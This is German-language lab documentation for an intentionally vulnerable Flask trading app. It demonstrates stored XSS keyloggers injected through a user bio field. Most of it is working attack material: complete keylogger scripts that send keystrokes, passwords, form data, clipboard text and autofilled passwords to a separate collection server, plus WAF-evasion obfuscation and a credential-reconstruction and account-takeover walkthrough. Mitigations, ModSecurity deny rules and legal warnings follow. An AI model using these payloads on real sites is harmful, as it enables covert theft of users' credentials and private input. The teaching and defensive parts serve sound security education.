# XSS Keylogger Test-Dokumentation
## Hebeln Mit Kopf - Keystroke Logging via Cross-Site Scripting

⚠️ **WICHTIG**: Diese Anwendung und dieses Tool sind absichtlich verwundbar für Bildungs- und Testzwecke. Keystroke-Logging ist **hochgradig invasiv** und verletzt die Privatsphäre. Verwenden Sie diese Techniken NIEMALS in Produktionsumgebungen oder ohne ausdrückliche Genehmigung!

---

## Übersicht

Dieses Modul demonstriert **Keystroke-Logging via XSS (Cross-Site Scripting)**. Es umfasst:
- Flask-basierter Keylogger-Server mit Real-time Monitoring
- Verschiedene Keylogger-Payload-Varianten (Full, Targeted, Obfuscated)
- Automatisches Logging und Keystroke-Rekonstruktion
- Analyzer-Tool zur Passwort-Extraktion aus captured Keystrokes

**Angriffsziel**: Erfassung aller Tastatureingaben inklusive Passwörter, Credentials und sensitiver Daten

---

## Setup

### 1. Installation

```bash
# Ins Keylogger Verzeichnis wechseln
cd xss_keylogger

# Dependencies installieren
pip install -r requirements.txt
```

### 2. Flask-App starten (in separatem Terminal)

```bash
# Zurück ins Hauptverzeichnis
cd ..

# Flask-App starten
python app.py
```

Die App läuft auf: **http://127.0.0.1:5001**

### 3. Keylogger-Server starten

```bash
# Im xss_keylogger Verzeichnis
python server.py
```

Der Server läuft auf: **http://127.0.0.1:8889**

---

## Identifizierte XSS-Schwachstellen

### Schwachstelle: Stored XSS via Bio-Feld (KRITISCH)

**Verwundbarer Code**:
```python
# app.py:33
bio = request.form.get("bio", "")[:512]  # Keine Sanitisierung!

# templates/users.html:35
{{ u.bio if u.bio else '...' }}  # Keine Output-Encoding!
```

**Auch betroffen**:
- `/templates/search.html:47` - Bio in Search Results

---

## Test 1: Full Keylogger - Alle Tastatureingaben erfassen

### Angriffsszenario

**Ziel**: JavaScript-Keylogger in Webseite injizieren, der **alle Tastatureingaben** captured und an Angreifer-Server sendet.

### Schritt 1: Keylogger-Server starten

```bash
cd xss_keylogger
python server.py
```

**Erwartete Ausgabe**:
```
================================================================================
⌨️  XSS KEYLOGGER SERVER
================================================================================
Server gestartet auf: http://127.0.0.1:8889/log
Status-Endpoint:      http://127.0.0.1:8889/status

⚠️  WICHTIG: Nur für autorisierte Penetrationstests verwenden!
⚠️  Keystroke-Logging ist hochgradig invasiv!

Warte auf Keystrokes...
================================================================================

LEGENDE: ⌨️  = Normal | 🔑 = Password-Feld
--------------------------------------------------------------------------------
```

### Schritt 2: Angreifer-Account erstellen mit Keylogger-Payload

1. Öffne: **http://127.0.0.1:5001/register**
2. Fülle Registrierungsformular aus:
   - **Username**: `keylog_attacker`
   - **Password**: `evil123`
   - **Bio**: Kopiere Payload aus `payloads/keylogger_full.html`

**Empfohlener Payload** (Full Keylogger):
```html
<script>
(function() {
    var sessionId = Math.random().toString(36).substr(2, 9);
    var buffer = [];
    var serverUrl = 'http://127.0.0.1:8889/log';
    var batchSize = 10;
    var sendInterval = 5000;

    function sendKeystrokes() {
        if (buffer.length === 0) return;
        var data = {
            keystrokes: buffer,
            sid: sessionId,
            page: window.location.href
        };
        fetch(serverUrl, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(data)
        }).catch(function(e) {});
        buffer = [];
    }

    document.addEventListener('keypress', function(e) {
        var fieldName = e.target.name || e.target.id || e.target.type || 'unknown';
        buffer.push({key: e.key, field: fieldName, timestamp: new Date().toISOString()});
        if (buffer.length >= batchSize) {sendKeystrokes();}
    });

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' || e.key === 'Enter' || e.key === 'Tab') {
            var fieldName = e.target.name || e.target.id || e.target.type || 'unknown';
            buffer.push({key: e.key, field: fieldName, timestamp: new Date().toISOString()});
            if (buffer.length >= batchSize) {sendKeystrokes();}
        }
    });

    setInterval(sendKeystrokes, sendInterval);
    window.addEventListener('beforeunload', sendKeystrokes);
})();
</script>
```

3. Klicke auf **Registrieren**
4. Keylogger-Payload ist jetzt in Datenbank gespeichert

### Schritt 3: Als Opfer einloggen

1. Öffne neues Inkognito-Fenster oder anderen Browser
2. Gehe zu: **http://127.0.0.1:5001/login**
3. Logge dich als legitimer User ein:
   - **Username**: `trader_max`
   - **Password**: `MyPassword123`

### Schritt 4: Opfer besucht verwundbare Seite

1. Nach erfolgreichem Login, navigiere zu: **http://127.0.0.1:5001/users**
2. Die Seite zeigt alle User inkl. Angreifer-Account
3. **Keylogger-Payload wird automatisch ausgeführt!**
4. Ab jetzt werden **alle Tastatureingaben** geloggt

### Schritt 5: Opfer tippt in verschiedene Felder

**Test-Szenarien**:

1. **Search-Feld testen**:
   - Navigiere zu: http://127.0.0.1:5001/search
   - Tippe im Search-Feld: `DAX Analyse`
   - Keystrokes werden captured!

2. **Login-Feld testen** (neues Tab):
   - Öffne neues Tab: http://127.0.0.1:5001/login
   - Tippe Username und Password eines anderen Users
   - **Credentials werden captured!**

3. **Registration testen**:
   - Navigiere zu: http://127.0.0.1:5001/register
   - Tippe neue Credentials
   - Alles wird geloggt!

### Schritt 6: Real-time Monitoring im Server

**Im Keylogger-Server Terminal siehst du in Echtzeit**:
```
⌨️  [search          ] D⌨️  [search          ] A⌨️  [search          ] X
⌨️  [search          ]  ⌨️  [search          ] A⌨️  [search          ] n
⌨️  [search          ] a⌨️  [search          ] l⌨️  [search          ] y
⌨️  [search          ] s⌨️  [search          ] e

🔑 [password        ] M🔑 [password        ] y🔑 [password        ] P
🔑 [password        ] a🔑 [password        ] s🔑 [password        ] s
🔑 [password        ] w🔑 [password        ] o🔑 [password        ] r
🔑 [password        ] d🔑 [password        ] 1🔑 [password        ] 2
🔑 [password        ] 3
```

**Legende**:
- ⌨️  = Normale Felder
- 🔑 = Password-Felder (hervorgehoben!)

### Schritt 7: Captured Keystrokes analysieren

```bash
# Im xss_keylogger Verzeichnis
python analyze_keystrokes.py
```

**Erwartete Ausgabe**:
```
================================================================================
⌨️  KEYSTROKE ANALYSIS REPORT
================================================================================

📊 STATISTIKEN:
   Total Keystrokes: 156
   Total Sessions:   1
   Unique IPs:       1
   Fields geloggt:   3

   Top 5 Fields (nach Keystroke-Anzahl):
      - password: 89 keystrokes
      - username: 42 keystrokes
      - search: 25 keystrokes

================================================================================
🔤 REKONSTRUIERTER INPUT (nach Feld):
================================================================================

🔑 Feld: password
   Input: "MyPassword123"
   Länge: 13 Zeichen
--------------------------------------------------------------------------------

📝 Feld: username
   Input: "crypto_lisa"
   Länge: 11 Zeichen
--------------------------------------------------------------------------------

📝 Feld: search
   Input: "DAX Analyse"
   Länge: 11 Zeichen
--------------------------------------------------------------------------------

================================================================================
🔐 CAPTURED PASSWORDS:
================================================================================

   Feld:     password
   Password: MyPassword123
--------------------------------------------------------------------------------

================================================================================
👤 CAPTURED CREDENTIALS:
================================================================================

   Credential Set #1:
      Username: crypto_lisa (Feld: username)
      Password: MyPassword123 (Feld: password)
--------------------------------------------------------------------------------

✅ Analyse abgeschlossen!
   Results gespeichert in:
      - results/keystroke_analysis.json
      - results/reconstructed_input.txt

================================================================================
```

### Schritt 8: Gestohlene Credentials verwenden

Mit den captured Credentials kann der Angreifer sich als Opfer einloggen:

```
Username: crypto_lisa
Password: MyPassword123
```

**Account Compromise erfolgreich!**

---

## Test 2: Targeted Keylogger - Nur Password-Felder

### Angriffsszenario

**Ziel**: Kleinerer, fokussierter Keylogger der **nur Password/Username-Felder** captured.

### Vorteile gegenüber Full Keylogger

- ✅ **Kleinere Payload-Größe** (~50% kleiner)
- ✅ **Weniger Netzwerk-Traffic**
- ✅ **Weniger auffällig** (weniger Requests)
- ✅ **Fokussiert auf sensitive Daten**

### Payload

Verwende `payloads/keylogger_targeted.html`:

```html
<script>
(function() {
    var sid = Math.random().toString(36).substr(2, 9);
    var url = 'http://127.0.0.1:8889/log';

    document.addEventListener('keypress', function(e) {
        var fieldType = e.target.type;
        var fieldName = e.target.name || e.target.id || 'unknown';

        // Nur Password, Username, Email Felder
        if (fieldType === 'password' ||
            fieldName.toLowerCase().includes('password') ||
            fieldName.toLowerCase().includes('username') ||
            fieldName.toLowerCase().includes('email') ||
            fieldName.toLowerCase().includes('pass')) {

            fetch(url + '?key=' + encodeURIComponent(e.key) +
                      '&field=' + encodeURIComponent(fieldName) +
                      '&page=' + encodeURIComponent(window.location.href) +
                      '&sid=' + sid)
                .catch(function(){});
        }
    });
})();
</script>
```

### Schritte

Identisch zu Test 1, aber mit kleinerer Payload:
1. Server starten
2. Account mit Targeted-Payload erstellen
3. Opfer besucht /users
4. Nur Password/Username-Felder werden geloggt
5. Analyse mit `python analyze_keystrokes.py`

---

## Test 3: Obfuscated Keylogger - Filter-Umgehung

### Angriffsszenario

**Ziel**: Keylogger mit Verschleierungstechniken um XSS-Filter und WAFs zu umgehen.

### Obfuscation-Techniken

#### Technik 1: Base64-Encoding

```html
<script>eval(atob('BASE64_ENCODED_PAYLOAD'))</script>
```

#### Technik 2: Hex-Encoding

```html
<script>eval('\x64\x6f\x63\x75\x6d\x65\x6e\x74...')</script>
```

#### Technik 3: String.fromCharCode

```javascript
var a = String.fromCharCode(100,111,99,117,109,101,110,116);  // "document"
var b = String.fromCharCode(97,100,100,69,118,101,110,116);   // "addEventListener"
```

#### Technik 4: String Concatenation

```javascript
document['add' + 'Event' + 'Listener']('key' + 'press', ...);
```

### Verwendung

Siehe `payloads/keylogger_obfuscated.html` für 7 verschiedene Obfuscation-Varianten.

**Wann verwenden?**
- XSS-Filter aktiv (ModSecurity, etc.)
- WAF blockiert Keywords ("fetch", "addEventListener")
- Content Security Policy teilweise umgangen werden muss

---

## Payload-Erklärungen

### 1. Full Keylogger (`keylogger_full.html`)

**Features**:
- ✅ Captured **alle Tasten** (keypress + keydown)
- ✅ **Batch-Sending** (Performance-optimiert)
- ✅ **Session-Tracking** via Random-ID
- ✅ **Paste-Event** Capture (Strg+V)
- ✅ **Page Context** (URL wird mitgesendet)
- ✅ **Auto-Send** bei Page-Unload

**Captured Keys**:
- Normale Zeichen (a-z, 0-9, Sonderzeichen)
- Backspace
- Enter
- Tab
- Space
- Paste-Events

**Buffer-Mechanismus**:
- Sammelt 10 Keys im Buffer
- Sendet als Batch an Server
- Reduziert Netzwerk-Traffic
- Performance-Optimierung

### 2. Targeted Keylogger (`keylogger_targeted.html`)

**Filter-Kriterien**:
```javascript
if (fieldType === 'password' ||
    fieldName.includes('password') ||
    fieldName.includes('username') ||
    fieldName.includes('email'))
```

**Vorteile**:
- Kleinere Payload-Größe
- Weniger False-Positives
- Fokussiert auf Credentials
- Weniger Daten-Transfer

### 3. Obfuscated Keylogger (`keylogger_obfuscated.html`)

**7 Varianten**:
1. Base64-Encoding mit `atob()`
2. Hex-Encoding mit `\x` Escape
3. CharCode-Construction mit `String.fromCharCode()`
4. Dynamic Function mit `new Function()`
5. String Concatenation
6. Comment Breaking mit `/* */`
7. Unicode Escapes mit `\u`

---

## Erweiterte Techniken

### 1. Form-Submission Capture

```javascript
document.addEventListener('submit', function(e) {
    var formData = new FormData(e.target);
    var data = {};
    for (var [key, value] of formData.entries()) {
        data[key] = value;
    }
    fetch('http://127.0.0.1:8889/log', {
        method: 'POST',
        body: JSON.stringify({type: 'form_submit', data: data})
    });
});
```

### 2. Clipboard Monitoring

```javascript
document.addEventListener('copy', function(e) {
    var selectedText = window.getSelection().toString();
    fetch('http://127.0.0.1:8889/log?event=copy&text=' + encodeURIComponent(selectedText));
});
```

### 3. Mouse Click Tracking

```javascript
document.addEventListener('click', function(e) {
    var target = e.target.tagName + (e.target.id ? '#' + e.target.id : '');
    fetch('http://127.0.0.1:8889/log?event=click&target=' + target);
});
```

### 4. Auto-Fill Detection

```javascript
setInterval(function() {
    document.querySelectorAll('input[type="password"]').forEach(function(input) {
        if (input.value && !input.dataset.logged) {
            fetch('http://127.0.0.1:8889/log?field=' + input.name + '&value=' + input.value + '&autofill=true');
            input.dataset.logged = 'true';
        }
    });
}, 1000);
```

---

## Mitigations (WIE MAN ES RICHTIG MACHT)

### 1. Output Encoding (PRIMÄR)

**❌ FALSCH**:
```python
# templates/users.html:35
{{ u.bio if u.bio else '...' }}
```

**✅ RICHTIG**:
```python
{{ (u.bio | e) if u.bio else '...' }}
```

### 2. Content Security Policy (CSP)

```python
# app.py
@app.after_request
def set_security_headers(response):
    response.headers['Content-Security-Policy'] = (
        "default-src 'self'; "
        "script-src 'self'; "                    # Keine inline-scripts!
        "connect-src 'self'; "                   # Keine externe Connections!
        "style-src 'self' 'unsafe-inline'"
    )
    return response
```

**Wichtig**: CSP blockiert:
- ❌ Inline `<script>` Tags
- ❌ `eval()` und `new Function()`
- ❌ `fetch()` zu externen Domains

### 3. Input Sanitization

```python
import bleach

# Bei Registrierung
bio = request.form.get("bio", "")
bio_clean = bleach.clean(
    bio,
    tags=['b', 'i', 'u', 'em', 'strong'],  # Nur harmlose Tags
    attributes={},                          # Keine Attribute!
    strip=True
)
```

### 4. Virtual Keyboard für Passwords

```html
<!-- Anti-Keylogger: Virtual Keyboard -->
<input type="password" name="password"
       oncopy="return false"
       onpaste="return false"
       oncut="return false"
       autocomplete="off"
       readonly onfocus="this.removeAttribute('readonly')">
```

### 5. Two-Factor Authentication (2FA)

**Selbst wenn Password gestohlen wird**:
- Angreifer braucht zusätzlich 2FA-Token
- Time-based One-Time Password (TOTP)
- SMS-Code oder Authenticator-App

### 6. Behavioral Analysis

```javascript
// Detect abnormal typing patterns
var lastKeyTime = 0;
document.addEventListener('keypress', function(e) {
    var now = Date.now();
    var timeDiff = now - lastKeyTime;

    // Menschen tippen nicht mit exakt 0ms Delay
    if (timeDiff < 10) {
        console.warn('Possible automated typing detected!');
        // Lock account, trigger alert, etc.
    }

    lastKeyTime = now;
});
```

---

## Testing Tools

### 1. Burp Suite

**Intercepting Keystrokes**:
1. Start Burp Proxy
2. Visit vulnerable page
3. Type in fields
4. Observe POST requests to http://127.0.0.1:8889/log
5. Analyze JSON payload structure

**Repeater**:
- Replay keystroke POST requests
- Test server validation
- Fuzzing with invalid data

### 2. Browser Developer Tools

**Network Tab**:
```
POST http://127.0.0.1:8889/log
Content-Type: application/json

{
  "keystrokes": [
    {"key": "M", "field": "password", "timestamp": "2025-12-02T15:23:45.123Z"},
    {"key": "y", "field": "password", "timestamp": "2025-12-02T15:23:45.234Z"},
    ...
  ],
  "sid": "abc123xyz"
}
```

**Console**:
- Test Payloads direkt in Console
- Debug JavaScript Errors
- Monitor fetch() Calls

### 3. OWASP ZAP

```bash
# Automated XSS Detection
zap-cli active-scan --scanners xss http://127.0.0.1:5001/register

# Spider + Scan
zap-cli spider http://127.0.0.1:5001
zap-cli active-scan http://127.0.0.1:5001
```

---

## Detektionsmethoden

### Server-Side Detection

**Anomalous Outbound Traffic**:
```bash
# Firewall Rules
iptables -A OUTPUT -p tcp --dport 8889 -j LOG --log-prefix "Suspicious-Outbound: "

# Monitor Logs
tail -f /var/log/syslog | grep "Suspicious-Outbound"
```

**WAF Rules (ModSecurity)**:
```
SecRule ARGS "@rx addEventListener" "id:100,deny,status:403"
SecRule ARGS "@rx keypress" "id:101,deny,status:403"
SecRule ARGS "@rx fetch\(" "id:102,deny,status:403"
```

### Client-Side Detection

**Anti-Keylogger Extensions**:
- Ghostery (Script Blocking)
- Privacy Badger
- NoScript

**Network Monitoring**:
```bash
# tcpdump für suspicious connections
tcpdump -i any -n 'port 8889'
```

---

## Demo-Accounts zum Testen

| Username | Password | Rolle |
|----------|----------|-------|
| admin | SecureP@ssw0rd! | Administrator |
| trader_max | MyPassword123 | Trader |
| crypto_lisa | Bitcoin2024! | Crypto Analyst |
| value_investor | WarrenB123 | Value Investor |
| swing_trader | TradeIt99 | Swing Trader |

**Test-Workflow**:
1. Erstelle Keylogger-Attacker Account
2. Logge dich als einer der Demo-User ein (in anderem Browser)
3. Besuche /users → Keylogger startet
4. Navigiere zu /login, tippe Credentials
5. Analyze captured keystrokes mit `python analyze_keystrokes.py`

---

## Lernressourcen

### Online Labs

- **PortSwigger Web Security Academy**: https://portswigger.net/web-security/cross-site-scripting
- **OWASP WebGoat**: XSS Module
- **HackTheBox**: Keylogger Challenges
- **TryHackMe**: XSS & Keylogging Rooms

### Weitere Lektüre

- **OWASP XSS Prevention Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- **CSP Documentation**: https://content-security-policy.com/
- **Keystroke Dynamics Research**: Behavioral Biometrics

### Video Tutorials

- **LiveOverflow**: "How Keyloggers Work"
- **Computerphile**: "XSS Explained"
- **IppSec**: HTB Keylogger Challenges

---

## ⚠️ ETHISCHER HINWEIS & RECHTLICHE KONSEQUENZEN

### **Keystroke-Logging ist HOCHGRADIG INVASIV!**

Dieses Tool demonstriert eine der invasivsten Angriffstechniken im Web-Security-Bereich. Keystroke-Logging verletzt die Privatsphäre in extremem Maße.

### Erlaubte Verwendung

✅ **NUR in folgenden Kontexten erlaubt**:
- Autorisierte Penetrationstests (schriftliche Genehmigung!)
- Eigene Test-Umgebungen und Lab-Setups
- CTF-Challenges und Hacking-Wettbewerbe
- Bug Bounty Programme (im Scope!)
- Security Research (mit Ethical Review Board)

### VERBOTEN

❌ **NIEMALS verwenden für**:
- Tests auf fremden Webseiten ohne Genehmigung
- Keystroke-Logging von echten Usern
- Passwort-Diebstahl von Produktionssystemen
- Jeglicher "neugieriger" Test ohne Autorisierung
- Spionage oder Stalking

### Rechtliche Konsequenzen

**Unbefugtes Keystroke-Logging ist strafbar**:

🇩🇪 **Deutschland**:
- §202a StGB (Ausspähen von Daten): bis zu 3 Jahre Haft
- §202b StGB (Abfangen von Daten): bis zu 2 Jahre Haft
- §263a StGB (Computerbetrug): bis zu 5 Jahre Haft
- DSGVO-Verstöße: Geldstrafen bis zu 20 Mio € oder 4% des Jahresumsatzes

🇺🇸 **USA**:
- Computer Fraud and Abuse Act (CFAA): bis zu 10 Jahre Haft
- Wiretap Act: bis zu 5 Jahre Haft pro Verstoß
- Electronic Communications Privacy Act (ECPA)

🇪🇺 **EU**:
- DSGVO Art. 6 (Rechtmäßigkeit der Verarbeitung)
- Cybercrime Convention (Budapest Convention)
- National Computer Misuse Acts

### Privacy Impact

**Keystroke-Logging captured**:
- 🔑 Alle Passwörter
- 💳 Kreditkartennummern
- 🆔 Personalausweisnummern
- 💌 Private Nachrichten
- 📧 E-Mails und vertrauliche Kommunikation
- 💼 Geschäftsgeheimnisse

**Dies ist ein schwerwiegender Eingriff in die Privatsphäre!**

### Verantwortungsvoller Umgang

1. **Nur in autorisierten Umgebungen testen**
2. **Captured Daten sicher löschen nach Tests**
3. **Keine echten Credentials verwenden**
4. **Server nur lokal laufen lassen (localhost)**
5. **Nach Tests aufräumen (XSS-Payload aus DB löschen)**
6. **Dokumentation lesen und verstehen**
7. **Wissen für defensive Security nutzen**

---

**🛡️ Verwende dein Wissen zum Schutz, nicht zum Schaden!**

**Version**: 1.0
**Autor**: Ethical Hacking Education
**Datum**: 2025-12-02
